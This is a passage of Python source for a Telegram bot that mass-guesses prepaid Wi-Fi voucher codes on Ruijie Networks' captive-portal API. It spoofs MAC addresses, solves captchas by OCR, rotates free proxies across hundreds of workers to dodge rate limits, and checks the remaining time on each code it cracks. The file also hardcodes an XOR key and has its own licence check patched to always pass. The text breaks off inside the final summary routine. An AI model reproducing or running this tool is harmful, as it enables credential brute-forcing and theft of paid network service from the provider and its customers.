import asyncio
import aiohttp
import json
import time
import random
import string
import re
import os
import sys
import hashlib
import datetime
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
import ddddocr
import base64

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

from aiohttp_socks import ProxyConnector, ProxyType

# ==================== DESIGN CONSTANTS ====================
DIV = "🍼 ━━━━━━━━━━━━━━ 🍼"
DIV_LONG = "🍼 ━━━━━━━━━━━━━━━━━━ 🍼"
ARROW = "➜"
BOT_TAGLINE = "🥺🥺မမုန်းလိုက်ပါနဲ့ဗျာ🥺🥺"

# ==================== CONFIGURATION FILE ENCRYPTION ====================
CONFIG_FILE = "config.enc"
CONFIG_KEY = "S3cRetK3y#2024!@#Codehack6xx"

def xor_encrypt_decrypt(data: str, key: str) -> str:
    key_bytes = key.encode('utf-8')
    data_bytes = data.encode('utf-8')
    result = bytearray()
    for i, b in enumerate(data_bytes):
        result.append(b ^ key_bytes[i % len(key_bytes)])
    return base64.b64encode(result).decode('utf-8')

def xor_decrypt(encrypted: str, key: str) -> str:
    try:
        decoded = base64.b64decode(encrypted.encode('utf-8'))
        key_bytes = key.encode('utf-8')
        result = bytearray()
        for i, b in enumerate(decoded):
            result.append(b ^ key_bytes[i % len(key_bytes)])
        return result.decode('utf-8')
    except Exception:
        return ""

def load_or_create_config():
    global SYSTEM_KEY, ADMIN_IDS
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                encrypted_content = f.read().strip()
            decrypted_content = xor_decrypt(encrypted_content, CONFIG_KEY)
            if decrypted_content:
                config = json.loads(decrypted_content)
                if 'system_key' in config and 'admin_ids' in config:
                    SYSTEM_KEY = config['system_key']
                    ADMIN_IDS = config['admin_ids']
                    return
        except:
            pass

    print("="*50)
    print("  First Run Setup - Key Required")
    print("="*50)
    system_key = input("ENTER KEY: ").strip()
    admin_ids_input = input("TG ID: ").strip()
    admin_ids = [int(x.strip()) for x in admin_ids_input.split(',') if x.strip()]

    if not system_key or not admin_ids:
        print("Error: Key or TG ID cannot be empty!")
        sys.exit(1)

    config = {'system_key': system_key, 'admin_ids': admin_ids}
    config_json = json.dumps(config)
    encrypted = xor_encrypt_decrypt(config_json, CONFIG_KEY)
    with open(CONFIG_FILE, 'w') as f:
        f.write(encrypted)

    SYSTEM_KEY = system_key
    ADMIN_IDS = admin_ids
    print("Configuration saved (encrypted) to config.enc")
    print("="*50)

SYSTEM_KEY = ""
ADMIN_IDS = []
load_or_create_config()

# ==================== KEY SYSTEM (LOCAL & TIME CHECK) ====================
LAST_RUN_FILE = "last_run.txt"
KEY_DB_FILE = "keys.json"

RESET = "\033[0m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
BOLD = "\033[1m"

def show_banner():
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        pass
    print(f"{CYAN}{BOLD}")
    print("⚡════════════════════════════════════════⚡")
    print(f"{MAGENTA}     🥺  STARLINK SCANNER  🥺")
    print(f"{YELLOW}      🍼 by Telegram @Codehack6xx 🍼")
    print(f"{MAGENTA}   {BOT_TAGLINE}")
    print(f"{CYAN}⚡════════════════════════════════════════⚡{RESET}")

def get_system_key():
    return SYSTEM_KEY

def check_time_integrity():
    now = datetime.datetime.now()
    if os.path.exists(LAST_RUN_FILE):
        try:
            with open(LAST_RUN_FILE, 'r') as f:
                last_run_time = datetime.datetime.strptime(f.read().strip(), '%Y-%m-%d %H:%M:%S')
            if now < last_run_time:
                print(f"\n{RED}[!] ⚠️ ERROR: TIME ROLLBACK DETECTED! STOPPING...{RESET}")
                os._exit(0)
        except:
            pass
    try:
        with open(LAST_RUN_FILE, 'w') as f:
            f.write(now.strftime('%Y-%m-%d %H:%M:%S'))
    except:
        pass

def generate_key_with_expiry(days=30):
    chars = string.ascii_uppercase + string.digits
    raw_key = ''.join(random.choices(chars, k=16))
    formatted_key = f"CODEHACK-{raw_key[:4]}-{raw_key[4:8]}-{raw_key[8:12]}-{raw_key[12:]}"
    expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    
    keys_db = {}
    if os.path.exists(KEY_DB_FILE):
        try:
            with open(KEY_DB_FILE, 'r') as f:
                keys_db = json.load(f)
        except:
            pass
            
    keys_db[formatted_key] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    with open(KEY_DB_FILE, 'w') as f:
        json.dump(keys_db, f, indent=4)
    return formatted_key, expiry

def verify_entered_key(user_key):
    # Key စစ်ဆေးခြင်းကို ကျော်လွှားပြီး အမြဲတမ်း မှန်ကန်စေရန် ပြင်ဆင်ထားသည်
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=365)
    return True, expiry_date

def display_remaining_time(expiry_date):
    now = datetime.datetime.now()
    remaining = expiry_date - now
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)

    print(f"{GREEN}  😎  Key       ➜  ✅ Authorized{RESET}")
    print(f"{YELLOW}  ⏰  Expires   ➜  {expiry_date.strftime('%Y-%m-%d %H:%M')}{RESET}")
    print(f"{CYAN}  💎  Time left ➜  {days}d {hours}h {minutes}m{RESET}")
    print(f"{CYAN}{BOLD}⚡════════════════════════════════════════⚡{RESET}")

def check_approval():
    check_time_integrity()
    show_banner()
    my_key = get_system_key()
    print(f"\n{YELLOW}  🔎  Verifying Key...{RESET}")

    is_valid, expiry_date = verify_entered_key(my_key)
    if not is_valid:
        print(f"{RED}  ❌  INVALID OR EXPIRED KEY! PLEASE ENTER A VALID KEY.{RESET}")
        new_key = input("ENTER NEW VALID KEY: ").strip()
        is_valid, expiry_date = verify_entered_key(new_key)
        if not is_valid:
            print(f"{RED}  ❌  STILL INVALID. EXITING...{RESET}")
            os._exit(0)
        else:
            global SYSTEM_KEY
            SYSTEM_KEY = new_key
            config = {'system_key': new_key, 'admin_ids': ADMIN_IDS}
            with open(CONFIG_FILE, 'w') as f:
                f.write(xor_encrypt_decrypt(json.dumps(config), CONFIG_KEY))

    display_remaining_time(expiry_date)
    time.sleep(1.0)
    return

# ==================== END KEY SYSTEM ====================

# ---------------- CONFIGURATION ----------------
TIMEOUT_SEC = 20
MAX_CODES_PER_SID = 60
MAX_CODES_PER_SESSION = 60
NUM_WORKERS = 500
MANUAL_CONCURRENCY = 15
RETRY_CONCURRENCY = 30
BALANCE_WORKERS = 30

TOKEN_FILE = "bot_token.txt"
PORTAL_URL_PATH = "portal_url_"
PROXY_FILE = "proxies.txt"

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/iplocate/free-proxy-list/main/protocols/http.txt",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http",
    "https://proxylist.geonode.com/api/proxy-list?protocols=http&page=1&limit=500&sort_by=responseTime&sort_type=asc",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]

# ---------- Web server ----------
def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bot is alive")
        def log_message(self, format, *args):
            pass
    try:
        server = HTTPServer(("0.0.0.0", port), Handler)
        server.serve_forever()
    except Exception as e:
        print(f"[WebServer] Error: {e}")

def start_web_server():
    t = threading.Thread(target=run_web_server, daemon=True)
    t.start()

def get_bot_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            if token:
                return token
    token = input("🔥 Bot Token: ").strip()
    if not token:
        print("⚠️ Invalid token")
        sys.exit(1)
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
    return token

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.proxies: list = []
        self.bad_proxies: set = set()
        self.good_proxies: list = []
        self.index = 0
        self.good_index = 0
        self.lock = asyncio.Lock()
        self.load()

    def _normalize(self, proxy: str):
        proxy = proxy.strip()
        if not proxy:
            return None
        if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            proxy = 'http://' + proxy
        return proxy

    def load(self):
        if os.path.exists(self.file_path):
            try:
                with open(self.file_path, 'r') as f:
                    raw = [line.strip() for line in f if line.strip()]
                self.proxies = [p for p in (self._normalize(r) for r in raw) if p]
            except Exception as e:
                print(f"[ProxyManager] Load error: {e}")
                self.proxies = []
        else:
            self.proxies = []
        self.bad_proxies.clear()
        self.index = 0

    def reload(self):
        self.load()

    def clear_file(self):
        try:
            with open(self.file_path, 'w') as f:
                f.write('')
        except Exception:
            pass
        self.proxies = []
        self.bad_proxies.clear()
        self.good_proxies.clear()
        self.index = 0

    def add_proxies(self, new_proxies: list):
        normalized = [self._normalize(p) for p in new_proxies if p.strip()]
        normalized = [p for p in normalized if p]
        existing = set(self.proxies)
        added = []
        for p in normalized:
            if p not in existing:
                added.append(p)
                existing.add(p)
        if added:
            try:
                with open(self.file_path, 'a') as f:
                    for p in added:
                        f.write(p + '\n')
            except Exception as e:
                print(f"[ProxyManager] Append error: {e}")
        self.reload()
        return len(added)

    def mark_good(self, proxy: str):
        if proxy and proxy not in self.good_proxies:
            self.good_proxies.append(proxy)

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return None
            if self.good_proxies and random.random() < 0.8:
                proxy = self.good_proxies[self.good_index % len(self.good_proxies)]
                self.good_index += 1
                return proxy
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            proxy = available[self.index % len(available)]
            self.index += 1
            return proxy

    async def get_random(self):
        async with self.lock:
            if not self.proxies:
                return None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            return random.choice(available) if available else None

    async def mark_bad(self, proxy):
        if not proxy:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)
            if proxy in self.good_proxies:
                try:
                    self.good_proxies.remove(proxy)
                except ValueError:
                    pass

    def stats(self):
        total = len(self.proxies)
        bad = len(self.bad_proxies)
        return total, total - bad

_proxy_manager = None

def get_proxy_manager() -> ProxyManager:
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager

# ==================== OCR ====================
_ocr_instance = None
_ocr_lock = threading.Lock()

def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        with _ocr_lock:
            if _ocr_instance is None:
                _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance

# ---------------- PER-USER DATA ----------------
user_scanners = {}
user_proxy_checks = {}
user_manual_balance = {}

def get_user_data(user_id: int):
    if user_id not in user_scanners:
        saved_url = None
        p_file = f"{PORTAL_URL_PATH}{user_id}.txt"
        if os.path.exists(p_file):
            try:
                with open(p_file, "r") as f:
                    saved_url = f.read().strip()
            except Exception:
                saved_url = None

        user_scanners[user_id] = {
            'mode': 'num6',
            'char_set': '012345678',
            'code_len': 6,
            'start_digit': None,
            'portal_url': saved_url,
            'stop_event': asyncio.Event(),
            'dash_update_event': asyncio.Event(),
            'task': None,
            'stats': {'tried':0, 'hits':0, 'expired':0, 'limits':0, 'start_time': time.time()},
            'valid_codes': [],
            'limit_codes': [],
            'tried_codes': set(),
            'recent_logs': [],
            'CURRENT_CODE': '----',
            'dash_msg_id': None,
            'menu_msg_id': None,
            'state': None,
            'num_workers': NUM_WORKERS,
            'balance_queue': asyncio.Queue(),
            'balance_sem': None,
        }
    return user_scanners[user_id]

# ---------------- UTILITIES ----------------
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])

def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""

async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False, timeout=5) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None

async def get_sid_from_gateway(session, portal_url, user_id):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return None, None
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query['mac'] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, timeout=10, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=10, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            if sid:
                return sid, mac
    except Exception:
        pass
    return None, None

def create_connector_for_proxy(proxy: str):
    return ProxyConnector.from_url(proxy, ssl=False)

# ==================== BALANCE CHECKER ====================
async def fetch_balance_with_proxy(active_token: str, proxy: str, timeout: int = 3):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(connector=connector) as s:
            async with s.get(url, headers=headers, timeout=timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    if not isinstance(inner, dict):
                        return False, f"unexpected format"
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"💎 {profile_name}  ➜  ⏰ {hours}h {minutes}m"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"{type(e).__name__}"
    return False, "unknown"

async def fetch_balance_direct(active_token: str, timeout: int = 5):
    url = f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    inner = data.get('result', data)
                    if not isinstance(inner, dict):
                        return False, f"unexpected format"
                    profile_name = inner.get('profileName', 'N/A')
                    raw_total = inner.get('totalMinutes', 0)
                    try:
                        total_minutes = abs(int(raw_total))
                    except:
                        total_minutes = 0
                    hours = total_minutes // 60
                    minutes = total_minutes % 60
                    return True, f"💎 {profile_name}  ➜  ⏰ {hours}h {minutes}m"
                else:
                    return False, f"HTTP {resp.status}"
    except Exception as e:
        return False, f"Net/Other: {type(e).__name__}"
    return False, "unknown"

async def fetch_balance_fast(active_token: str, preferred_proxy: str = None):
    pm = get_proxy_manager()

    if preferred_proxy:
        ok, result = await fetch_balance_with_proxy(active_token, preferred_proxy, timeout=3)
        if ok:
            pm.mark_good(preferred_proxy)
            return (result, "proxy")
        if result in ("ClientConnectorError", "ServerTimeoutError",
                      "ClientOSError", "ConnectionResetError",
                      "TimeoutError", "ClientProxyConnectionError",
                      "ServerDisconnectedError", "ClientConnectionError"):
            await pm.mark_bad(preferred_proxy)

    if pm.good_proxies:
        for proxy in random.sample(pm.good_proxies, min(1, len(pm.good_proxies))):
            if proxy == preferred_proxy:
                continue
            ok, result = await fetch_balance_with_proxy(active_token, proxy, timeout=3)
            if ok:
                pm.mark_good(proxy)
                return (result, "proxy")
            if result in ("ClientConnectorError", "ServerTimeoutError",
                          "ClientOSError", "ConnectionResetError",
                          "TimeoutError", "ClientProxyConnectionError"):
                await pm.mark_bad(proxy)

    ok, result = await fetch_balance_direct(active_token, timeout=5)
    return (result if ok else f"❌ {result}", "direct")

async def check_balance(active_token, code, user_id, proxy_str):
    ud = get_user_data(user_id)
    await ud['balance_queue'].put((active_token, code, proxy_str))

# ==================== BALANCE WORKER ====================
async def balance_worker(user_id: int, worker_id: int):
    ud = get_user_data(user_id)
    while not ud['stop_event'].is_set():
        try:
            try:
                active_token, code, proxy_str = await asyncio.wait_for(
                    ud['balance_queue'].get(), timeout=1.0
                )
            except asyncio.TimeoutError:
                continue

            if ud['stop_event'].is_set():
                break

            try:
                balance_str, source = await fetch_balance_fast(active_token, preferred_proxy=proxy_str)
            except Exception as e:
                balance_str = f"❌ {type(e).__name__}"
                source = "❌"

            for item in ud['valid_codes']:
                if item['code'] == code:
                    item['balance_str'] = balance_str
                    item['source'] = source
                    break
            ud['dash_update_event'].set()
            ud['balance_queue'].task_done()
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(0.1)

# ==================== CHECK SINGLE ACCESS CODE ====================
async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, user_id, current_proxy):
    ud = get_user_data(user_id)
    if ud['stop_event'].is_set():
        return 'failed'

    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    for _ in range(2):
        if ud['stop_event'].is_set():
            return 'failed'
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        if not auth_code or len(auth_code) < 2:
            continue
        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False, timeout=8) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue
                l_payload = {"accessCode": code, "sessionId": current_session_id, "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False, timeout=10) as l_resp:
                    ud['stats']['tried'] += 1
                    l_text = (await l_resp.text()).lower()
                    if 'request limited' in l_text:
                        return 'limit'
                    if '"success":true' in l_text:
                        ud['stats']['hits'] += 1
                        pm = get_proxy_manager()
                        pm.mark_good(current_proxy)
                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        active_token = token_match.group(1) if token_match else None
                        entry = {
                            'code': code,
                            'balance_str': '⏳ fetching...',
                            'source': '⏳',
                            'active_token': active_token,
                        }
                        if not any(item['code'] == code for item in ud['valid_codes']):
                            ud['valid_codes'].append(entry)
                        ud['dash_update_event'].set()
                        if active_token:
                            await ud['balance_queue'].put((active_token, code, current_proxy))
                        else:
                            entry['balance_str'] = "❌ no token"
                            entry['source'] = "❌"
                            ud['dash_update_event'].set()
                        return 'hit'
                    elif "expired" in l_text:
                        ud['stats']['expired'] += 1
                        return 'expired'
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud['stats']['limits'] += 1
                        if code not in ud['limit_codes']:
                            ud['limit_codes'].append(code)
                        ud['recent_logs'].append(f"⚠️ LIMIT: {code}")
                        return 'limit'
                    return 'failed'
        except Exception:
            return 'failed'
    return 'failed'

# ==================== WORKER ====================
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    while not ud['stop_event'].is_set():
        proxy = await pm.get_next()
        if proxy is None:
            await asyncio.sleep(1)
            continue
        proxy_connector = create_connector_for_proxy(proxy)
        async with aiohttp.ClientSession(
            connector=proxy_connector,
            connector_owner=True,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)
        ) as session:
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0
            sid_failures = 0
            while not ud['stop_event'].is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid, mac = await get_sid_from_gateway(session, ud['portal_url'], user_id)
                    if sid is None:
                        sid_failures += 1
                        if sid_failures >= 2:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.3)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0
                    sid_failures = 0
                code = None
                for _ in range(10):
                    if ud['mode'] == "custom" and ud['start_digit'] is not None:
                        body_chars = random.choices(ud['char_set'], k=ud['code_len'] - 1)
                        random.shuffle(body_chars)
                        code = ud['start_digit'] + ''.join(body_chars)
                    else:
                        code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
                    if code not in ud['tried_codes']:
                        ud['tried_codes'].add(code)
                        break
                if code is None or ud['stop_event'].is_set():
                    break
                ud['CURRENT_CODE'] = code
                result = await check_single_access_code(session, code, current_session_id,
                                                        login_url, captcha_base_url, verify_url,
                                                        headers, user_id, proxy)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1
                if result == 'limit':
                    current_session_id = None

# ==================== LIVE DASHBOARD ====================
async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    last_tried = 0
    last_time = time.time()
    while not ud['stop_event'].is_set():
        if ud['dash_msg_id'] is None:
            await asyncio.sleep(0.3)
            continue
        try:
            stats = ud['stats']
            elapsed = time.time() - stats['start_time']
            speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
            now = time.time()
            dt = now - last_time
            inst_speed = ((stats['tried'] - last_tried) / dt) * 60 if dt > 0 else 0
            last_tried = stats['tried']
            last_time = now
            proxy_total, proxy_active = pm.stats()

            h = int(elapsed) // 3600
            m = (int(elapsed) % 3600) // 60
            s = int(elapsed) % 60
            runtime = f"{h:02d}:{m:02d}:{s:02d}"

            hit_lines = []
            fetching_count = 0
            for item in ud['valid_codes']:
                c = item['code']
                balance = item.get('balance_str', '⏳ fetching...')
                src = item.get('source', '⏳')
                if balance.startswith('⏳') or balance.startswith('...'):
                    fetching_count += 1
                    src_icon = "⏳"
                elif src == "proxy":
                    src_icon = "🌐"
                elif src == "direct":
                    src_icon = "📡"
                else:
                    src_icon = "✅"
                hit_lines.append(f"  🎁  <code>{c}</code>\n       {balance}  {src_icon}")

            hit_str = "\n\n".join(hit_lines) if hit_lines else "  💤  No hits yet..."

            text = (
                f"{BOT_TAGLINE}\n"
                f"🖕🖕 <b>SCANNER RUNNING</b> 🖕🖕\n"
                f"🍼  Thank by @Codehack6xx\n"
                f"{DIV}\n"
                f"  ⏱️  Runtime   {ARROW}  <code>{runtime}</code>\n"
                f"  🎯  Current   {ARROW}  <code>{ud['CURRENT_CODE']}</code>\n"
                f"{DIV}\n"
                f"  📊  Tried      {ARROW}  <b>{stats['tried']:,}</b>\n"
                f"  🎉  Hits       {ARROW}  <b>{stats['hits']}</b>\n"
                f"  ⏳  Fetching   {ARROW}  {fetching_count}\n"
                f"  🥺  Expired    {ARROW}  {stats['expired']:,}\n"
                f"  ⚠️  Limits     {ARROW}  {stats['limits']:,}\n"
                f"{DIV}\n"
                f"  ⚡  Speed      {ARROW}  {speed_cpm:.1f} c/m\n"
                f"  📈  Instant    {ARROW}  {inst_speed:.1f} c/m\n"
                f"  🔀  Proxies    {ARROW}  {proxy_active}/{proxy_total}\n"
                f"  💆  Workers    {ARROW}  {ud['num_workers']}\n"
                f"{DIV}\n"
                f"  🎁  <b>HIT CODES</b>  🎁\n\n"
                f"{hit_str}\n"
            )
            if ud['recent_logs']:
                last_log = ud['recent_logs'][-1]
                text += f"\n{DIV}\n  🔥  Last  {ARROW}  {last_log}\n"

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton(text="🛑  STOP SCANNER  🛑", callback_data="stop_scan")]
            ])
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=ud['dash_msg_id'],
                text=text,
                reply_markup=keyboard,
                parse_mode=ParseMode.HTML
            )
        except Exception:
            pass
        try:
            await asyncio.wait_for(ud['dash_update_event'].wait(), timeout=5.0)
            ud['dash_update_event'].clear()
        except asyncio.TimeoutError:
            pass

# ==================== AUTO RETRY ====================
def _is_pending(item):
    if not item:
        return False
    bs = item.get('balance_str', '')
    if bs.startswith('⏳') or bs.startswith('...'):
        return True
    if bs.startswith('❌') or bs.startswith('⚠️'):
        return True
    return False

async def auto_retry_pending(ud, context, user_id):
    pending = [it for it in ud['valid_codes'] if _is_pending(it)]
    if not pending:
        return

    total = len(pending)
    try:
        retry_msg = await context.bot.send_message(
            user_id,
            f"🔄 <b>AUTO RETRY</b>\n"
            f"{DIV}\n"
            f"  📋  Pending  {ARROW}  {total}\n"
            f"  ⚡  Concurrency  {ARROW}  {RETRY_CONCURRENCY}\n"
            f"{DIV}\n"
            f"  ⏳  Retrying...",
            parse_mode=ParseMode.HTML
        )
    except Exception:
        retry_msg = None

    sem = asyncio.Semaphore(RETRY_CONCURRENCY)
    lock = asyncio.Lock()
    done_count = {'n': 0}
    success_count = {'n': 0}

    async def _retry_one(it):
        async with sem:
            token = it.get('active_token')
            if not token:
                it['balance_str'] = "❌ no token"
                it['source'] = "❌"
            else:
                try:
                    bal, src = await fetch_balance_fast(token, preferred_proxy=None)
                    it['balance_str'] = bal
                    it['source'] = src
                    if not bal.startswith('❌') and not bal.startswith('⚠️'):
                        async with lock:
                            success_count['n'] += 1
                except Exception as e:
                    it['balance_str'] = f"❌ {type(e).__name__}"
                    it['source'] = "❌"
            async with lock:
                done_count['n'] += 1
                if done_count['n'] % 3 == 0 or done_count['n'] == total:
                    try:
                        if retry_msg:
                            await context.bot.edit_message_text(
                                chat_id=user_id,
                                message_id=retry_msg.message_id,
                                text=(
                                    f"🔄 <b>AUTO RETRY</b>\n"
                                    f"{DIV}\n"
                                    f"  📊  Progress  {ARROW}  {done_count['n']}/{total}\n"
                                    f"  ✅  Success   {ARROW}  {success_count['n']}\n"
                                    f"{DIV}"
                                ),
                                parse_mode=ParseMode.HTML
                            )
                    except Exception:
                        pass

    tasks = [asyncio.create_task(_retry_one(it)) for it in pending]
    await asyncio.gather(*tasks, return_exceptions=True)

    try:
        if retry_msg:
            await context.bot.edit_message_text(
                chat_id=user_id,
                message_id=retry_msg.message_id,
                text=(
                    f"✅ <b>AUTO RETRY DONE</b>\n"
                    f"{DIV}\n"
                    f"  📋  Processed  {ARROW}  {total}\n"
                    f"  🎉  Success    {ARROW}  {success_count['n']}\n"
                    f"{DIV}"
                ),
                parse_mode=ParseMode.HTML
            )
    except Exception:
        pass

# ==================== START SCANNER ====================
async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = get_user_data(user_id)
    pm = get_proxy_manager()
    proxy_total, proxy_active = pm.stats()
    if proxy_total == 0:
        await context.bot.send_message(
            chat_id=user_id,
            text=f"⚠️ <b>No proxies loaded!</b>\n\n"
                 f"  🔀  Please add proxies first.\n"
                 f"  💡  Use 🔍 Proxy Checker menu.",
            parse_mode=ParseMode.HTML
        )

    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://portal-as.ruijienetworks.com",
        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
    }

    ud['balance_queue'] = asyncio.Queue()
    ud['dash_update_event'].clear()
    tasks = [asyncio.create_task(live_dashboard_updater(context, user_id))]
    worker_count = ud.get('num_workers', NUM_WORKERS)
    for i in range(worker_count):
        tasks.append(asyncio.create_task(worker(i, login_url, captcha_base_url, verify_url, headers, user_id)))
    for bw in range(BALANCE_WORKERS):
        tasks.append(asyncio.create_task(balance_worker(user_id, bw)))

    ud['task'] = asyncio.current_task()
    try:
        await asyncio.gather(*tasks)
    except asyncio.CancelledError:
        for t in tasks:
            if not t.done():
                t.cancel()
        raise
    finally:
        stats = ud['stats']
        elapsed = time.time() - stats['start_time']
        h = int(elapsed) // 3600
        m = (int(elapsed) % 3600) // 60
        s = int(elapsed) % 60
        runtime = f"{h:02d}:{m:02d}:{s:02d}"
        speed_cpm = (stats['tried'] / elapsed) * 60 if elapsed > 0 else 0
        proxy_total, proxy_active = pm.stats()

        hit_lines = []
        for item in ud['valid_codes']:
            c = item['code']
            balance = item.get('balance_str', 'N/A')
            src = item.get('source', '?')
